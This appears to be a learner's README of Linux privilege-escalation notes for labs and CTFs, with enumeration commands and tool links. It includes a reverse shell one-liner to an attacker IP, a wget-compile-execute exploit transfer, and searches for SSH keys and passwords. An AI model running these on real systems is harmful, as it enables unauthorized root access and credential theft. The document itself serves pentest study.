🐧 Linux Privilege Escalation

A practical collection of Linux enumeration, privilege escalation techniques, tools, and references gathered from hands-on labs, CTFs, and security courses.

This repository is part of my pentesting & red team learning journey, focusing on post-exploitation methodology and real-world misconfigurations.

🎯 Objectives

Understand Linux privilege escalation fundamentals

Practice manual & automated enumeration

Identify misconfigurations, weak permissions, and kernel vulnerabilities

Apply techniques in TryHackMe, labs, and CTF environments

📚 Learning Resources

g0tmi1k – Basic Linux Privilege Escalation
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

PayloadsAllTheThings – Linux PrivEsc
https://github.com/swisskyrepo/PayloadsAllTheThings

HackTricks – Linux PrivEsc Checklist
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

Sushant 747 – OSCP Linux Guide
https://sushant747.gitbooks.io/total-oscp-guide/

All-in-One Resource Repo
https://github.com/Gr1mmie/Linux-Privilege-Escalation-Resources

🧪 Labs & Practice

TryHackMe – Linux PrivEsc Arena
https://tryhackme.com/room/linuxprivescarena

Linux PrivEsc Playground
https://tryhackme.com/room/privescplayground

TryHackMe Platform
https://tryhackme.com/

🛠️ Enumeration Tools
Tool	Purpose
LinPEAS	Automated privilege escalation checks
LinEnum	Lightweight enumeration
Linux Exploit Suggester	Kernel exploit detection
Linux Priv Checker	Permission & config analysis

🔗 https://github.com/carlospolop/PEASS-ng

🔗 https://github.com/rebootuser/LinEnum

🔍 Manual Enumeration (Core Commands)
hostname
uname -a
cat /etc/issue
ps aux
env
sudo -l
id
history

Users
cat /etc/passwd | grep home

Networking
ifconfig
ip route
netstat -ano

🔎 File & Permission Hunting
SUID Files
find / -perm -u=s -type f 2>/dev/null

Writable Directories
find / -writable -type d 2>/dev/null

SSH Keys & Passwords
find / -name id_rsa 2>/dev/null
grep -rwn / -ie "password" 2>/dev/null

🔓 GTFOBins

GTFOBins is a curated list of Unix binaries that can be abused to bypass local security restrictions.

🔗 https://gtfobins.github.io/

Used frequently for:

SUID abuse

sudo misconfigurations

Restricted shell escapes

🔁 Reverse Shell Basics
Netcat Listener (Attacker)
nc -lvnp <PORT>

Reverse Shell (Victim)
mkfifo /tmp/f; nc <ATTACKER-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Upgrade Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm

💣 Kernel Privilege Escalation
Methodology

Identify kernel version

Search for public exploits

Transfer exploit to target

Compile & execute

Example
# Attacker
python3 -m http.server 8000

# Victim
cd /tmp
wget http://ATTACKER-IP:8000/exploit.c
gcc exploit.c -o exploit
./exploit


➡️ Result: Root access (lab environment)

🔐 Privilege Escalation: SUID

SUID binaries execute with the file owner’s privileges, often leading to escalation if misconfigured.

find / -type f -perm -4000 2>/dev/null


Combine results with GTFOBins for exploitation paths.

📌 Key Takeaways

Enumeration never stops

Most privesc paths come from misconfigurations

Combine manual thinking + automated tools

Always validate exploits in authorized environments only

👤 Author

Ly Sophavin
Cybersecurity | Pentesting | DFIR | OSINT
Focused on offense-driven defense & real-world security monitorin
